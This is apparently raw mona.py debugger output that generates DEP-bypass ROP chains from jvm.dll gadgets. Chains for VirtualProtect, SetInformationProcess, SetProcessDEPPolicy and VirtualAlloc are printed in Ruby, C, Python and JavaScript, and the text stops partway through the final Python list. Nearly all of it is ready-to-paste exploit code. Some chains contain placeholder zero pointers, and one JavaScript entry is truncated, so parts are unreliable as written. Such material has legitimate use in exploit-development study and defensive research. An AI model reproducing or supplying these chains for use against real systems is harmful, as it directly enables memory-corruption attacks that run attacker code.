0BADF00D        - Progress update : 1000 / 9075 items processed (Tue 2018/10/30 04:49:37 AM) - (11%)
0BADF00D        - Progress update : 2000 / 9075 items processed (Tue 2018/10/30 04:49:48 AM) - (22%)
0BADF00D        - Progress update : 3000 / 9075 items processed (Tue 2018/10/30 04:49:58 AM) - (33%)
0BADF00D        - Progress update : 4000 / 9075 items processed (Tue 2018/10/30 04:50:08 AM) - (44%)
0BADF00D        - Progress update : 5000 / 9075 items processed (Tue 2018/10/30 04:50:18 AM) - (55%)
0BADF00D        - Progress update : 6000 / 9075 items processed (Tue 2018/10/30 04:50:29 AM) - (66%)
0BADF00D        - Progress update : 7000 / 9075 items processed (Tue 2018/10/30 04:50:40 AM) - (77%)
0BADF00D        - Progress update : 8000 / 9075 items processed (Tue 2018/10/30 04:50:50 AM) - (88%)
0BADF00D        - Progress update : 9000 / 9075 items processed (Tue 2018/10/30 04:51:01 AM) - (99%)
0BADF00D        - Progress update : 9075 / 9075 items processed (Tue 2018/10/30 04:51:01 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:51:21 AM: Step 1/7: esi
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 7/7: eax
0BADF00D  [+] Preparing output file 'jvm_virtualprotect.xml'
0BADF00D      - (Re)setting logfile jvm_virtualprotect.xml
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:51:22 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:51:24 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:51:24 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:51:25 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:51:25 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:51:25 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:51:25 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 1/7: esi
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:51:27 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d34fd43,  # POP EAX # RETN [jvm.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() [IAT jvm.dll]
                0x6d3be1b2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3d6b54,  # XCHG EAX,ESI # RETN [jvm.dll] 
                0x6d37880c,  # POP EBP # RETN [jvm.dll] 
                0x6d3a11c7,  # & push esp # ret  [jvm.dll]
                0x6d38dd7e,  # POP EBX # RETN [jvm.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00000040,  # 0x00000040-> edx
                0x6d35ea9a,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d40e241,  # &Writable location [jvm.dll]
                0x6d3b5f2d,  # POP EDI # RETN [jvm.dll] 
                0x6d341001,  # RETN (ROP NOP) [jvm.dll]
                0x6d3ec89d,  # POP EAX # RETN [jvm.dll] 
                0x90909090,  # nop
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d34fd43,  // POP EAX // RETN [jvm.dll] 
                0x6d3f8098,  // ptr to &VirtualProtect() [IAT jvm.dll]
                0x6d3be1b2,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [jvm.dll] 
                0x6d3d6b54,  // XCHG EAX,ESI // RETN [jvm.dll] 
                0x6d37880c,  // POP EBP // RETN [jvm.dll] 
                0x6d3a11c7,  // & push esp // ret  [jvm.dll]
                0x6d38dd7e,  // POP EBX // RETN [jvm.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x6d3edd29,  // POP EDX // TEST AL,0FE // DEC ECX // RETN 0x24 [jvm.dll] 
                0x00000040,  // 0x00000040-> edx
                0x6d35ea9a,  // POP ECX // RETN [jvm.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d40e241,  // &Writable location [jvm.dll]
                0x6d3b5f2d,  // POP EDI // RETN [jvm.dll] 
                0x6d341001,  // RETN (ROP NOP) [jvm.dll]
                0x6d3ec89d,  // POP EAX // RETN [jvm.dll] 
                0x90909090,  // nop
                0x6d35390f,  // PUSHAD // RETN [jvm.dll] 
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d34fd43,  # POP EAX # RETN [jvm.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() [IAT jvm.dll]
                0x6d3be1b2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3d6b54,  # XCHG EAX,ESI # RETN [jvm.dll] 
                0x6d37880c,  # POP EBP # RETN [jvm.dll] 
                0x6d3a11c7,  # & push esp # ret  [jvm.dll]
                0x6d38dd7e,  # POP EBX # RETN [jvm.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00000040,  # 0x00000040-> edx
                0x6d35ea9a,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d40e241,  # &Writable location [jvm.dll]
                0x6d3b5f2d,  # POP EDI # RETN [jvm.dll] 
                0x6d341001,  # RETN (ROP NOP) [jvm.dll]
                0x6d3ec89d,  # POP EAX # RETN [jvm.dll] 
                0x90909090,  # nop
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%ufd43%u6d34" + // 0x6d34fd43 : ,# POP EAX # RETN [jvm.dll] 
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() [IAT jvm.dll]
              "%ue1b2%u6d3b" + // 0x6d3be1b2 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
              "%u6b54%u6d3d" + // 0x6d3d6b54 : ,# XCHG EAX,ESI # RETN [jvm.dll] 
              "%u880c%u6d37" + // 0x6d37880c : ,# POP EBP # RETN [jvm.dll] 
              "%u11c7%u6d3a" + // 0x6d3a11c7 : ,# & push esp # ret[jvm.dll]
              "%udd7e%u6d38" + // 0x6d38dd7e : ,# POP EBX # RETN [jvm.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%udd29%u6d3e" + // 0x6d3edd29 : ,# POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%uea9a%u6d35" + // 0x6d35ea9a : ,# POP ECX # RETN [jvm.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ue241%u6d40" + // 0x6d40e241 : ,# &Writable location [jvm.dll]
              "%u5f2d%u6d3b" + // 0x6d3b5f2d : ,# POP EDI # RETN [jvm.dll] 
              "%u1001%u6d34" + // 0x6d341001 : ,# RETN (ROP NOP) [jvm.dll]
              "%uc89d%u6d3e" + // 0x6d3ec89d : ,# POP EAX # RETN [jvm.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u390f%u6d35" + // 0x6d35390f : ,# PUSHAD # RETN [jvm.dll] 
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find API pointer -> eax
                0x6d3ca9cb,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3caa4e,  # XCHG EAX,EBP # RETN [jvm.dll] 
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00000022,  # 0x00000022-> edx
                0x6d375b0a,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d33013c,  # &0x00000002 [jvm.dll]
                0x6d3c1f85,  # POP EBX # RETN [jvm.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d34fcc0,  # POP EAX # RETN [jvm.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d3baade,  # POP EDI # RETN [jvm.dll] 
                0x6d3baade,  # skip 4 bytes [jvm.dll]
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find API pointer -> eax
                0x6d3ca9cb,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [jvm.dll] 
                0x6d3caa4e,  // XCHG EAX,EBP // RETN [jvm.dll] 
                0x6d3edd29,  // POP EDX // TEST AL,0FE // DEC ECX // RETN 0x24 [jvm.dll] 
                0x00000022,  // 0x00000022-> edx
                0x6d375b0a,  // POP ECX // RETN [jvm.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d33013c,  // &0x00000002 [jvm.dll]
                0x6d3c1f85,  // POP EBX // RETN [jvm.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x6d34fcc0,  // POP EAX // RETN [jvm.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d3baade,  // POP EDI // RETN [jvm.dll] 
                0x6d3baade,  // skip 4 bytes [jvm.dll]
                0x6d35390f,  // PUSHAD // RETN [jvm.dll] 
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find API pointer -> eax
                0x6d3ca9cb,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3caa4e,  # XCHG EAX,EBP # RETN [jvm.dll] 
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00000022,  # 0x00000022-> edx
                0x6d375b0a,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d33013c,  # &0x00000002 [jvm.dll]
                0x6d3c1f85,  # POP EBX # RETN [jvm.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d34fcc0,  # POP EAX # RETN [jvm.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d3baade,  # POP EDI # RETN [jvm.dll] 
                0x6d3baade,  # skip 4 bytes [jvm.dll]
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax
              "%ua9cb%u6d3c" + // 0x6d3ca9cb : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
              "%uaa4e%u6d3c" + // 0x6d3caa4e : ,# XCHG EAX,EBP # RETN [jvm.dll] 
              "%udd29%u6d3e" + // 0x6d3edd29 : ,# POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%u375b" + // 0x6d375b0a : ,# POP ECX # RETN [jvm.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u013c%u6d33" + // 0x6d33013c : ,# &0x00000002 [jvm.dll]
              "%u1f85%u6d3c" + // 0x6d3c1f85 : ,# POP EBX # RETN [jvm.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%ufcc0%u6d34" + // 0x6d34fcc0 : ,# POP EAX # RETN [jvm.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%uaade%u6d3b" + // 0x6d3baade : ,# POP EDI # RETN [jvm.dll] 
              "%uaade%u6d3b" + // 0x6d3baade : ,# skip 4 bytes [jvm.dll]
              "%u390f%u6d35" + // 0x6d35390f : ,# PUSHAD # RETN [jvm.dll] 
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d386bce,  # POP EBX # RETN [jvm.dll] 
                0x6d330011,  # &0x00000000 [jvm.dll]
                0x6d38eb84,  # POP EDI # RETN [jvm.dll] 
                0x6d38eb84,  # skip 4 bytes [jvm.dll]
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d386bce,  // POP EBX // RETN [jvm.dll] 
                0x6d330011,  // &0x00000000 [jvm.dll]
                0x6d38eb84,  // POP EDI // RETN [jvm.dll] 
                0x6d38eb84,  // skip 4 bytes [jvm.dll]
                0x6d35390f,  // PUSHAD // RETN [jvm.dll] 
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d386bce,  # POP EBX # RETN [jvm.dll] 
                0x6d330011,  # &0x00000000 [jvm.dll]
                0x6d38eb84,  # POP EDI # RETN [jvm.dll] 
                0x6d38eb84,  # skip 4 bytes [jvm.dll]
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u6bce%u6d38" + // 0x6d386bce : ,# POP EBX # RETN [jvm.dll] 
              "%u0011%u6d33" + // 0x6d330011 : ,# &0x00000000 [jvm.dll]
              "%ueb84%u6d38" + // 0x6d38eb84 : ,# POP EDI # RETN [jvm.dll] 
              "%ueb84%u6d38" + // 0x6d38eb84 : ,# skip 4 bytes [jvm.dll]
              "%u390f%u6d35" + // 0x6d35390f : ,# PUSHAD # RETN [jvm.dll] 
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d345dbe,  # POP EAX # RETN [jvm.dll] 
                0x6d3f8090,  # ptr to &VirtualAlloc() [IAT jvm.dll]
                0x6d3cbea4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3d6b54,  # XCHG EAX,ESI # RETN [jvm.dll] 
                0x6d39fcf5,  # POP EBP # RETN [jvm.dll] 
                0x6d34e2fe,  # & push esp # ret  [jvm.dll]
                0x6d38379b,  # POP EBX # RETN [jvm.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00001000,  # 0x00001000-> edx
                0x6d3c67c8,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d371c5e,  # POP EDI # RETN [jvm.dll] 
                0x6d341001,  # RETN (ROP NOP) [jvm.dll]
                0x6d3c1c57,  # POP EAX # RETN [jvm.dll] 
                0x90909090,  # nop
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d345dbe,  // POP EAX // RETN [jvm.dll] 
                0x6d3f8090,  // ptr to &VirtualAlloc() [IAT jvm.dll]
                0x6d3cbea4,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [jvm.dll] 
                0x6d3d6b54,  // XCHG EAX,ESI // RETN [jvm.dll] 
                0x6d39fcf5,  // POP EBP // RETN [jvm.dll] 
                0x6d34e2fe,  // & push esp // ret  [jvm.dll]
                0x6d38379b,  // POP EBX // RETN [jvm.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x6d3edd29,  // POP EDX // TEST AL,0FE // DEC ECX // RETN 0x24 [jvm.dll] 
                0x00001000,  // 0x00001000-> edx
                0x6d3c67c8,  // POP ECX // RETN [jvm.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> ecx
                0x6d371c5e,  // POP EDI // RETN [jvm.dll] 
                0x6d341001,  // RETN (ROP NOP) [jvm.dll]
                0x6d3c1c57,  // POP EAX // RETN [jvm.dll] 
                0x90909090,  // nop
                0x6d35390f,  // PUSHAD // RETN [jvm.dll] 
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d345dbe,  # POP EAX # RETN [jvm.dll] 
                0x6d3f8090,  # ptr to &VirtualAlloc() [IAT jvm.dll]
                0x6d3cbea4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
                0x6d3d6b54,  # XCHG EAX,ESI # RETN [jvm.dll] 
                0x6d39fcf5,  # POP EBP # RETN [jvm.dll] 
                0x6d34e2fe,  # & push esp # ret  [jvm.dll]
                0x6d38379b,  # POP EBX # RETN [jvm.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d3edd29,  # POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
                0x00001000,  # 0x00001000-> edx
                0x6d3c67c8,  # POP ECX # RETN [jvm.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
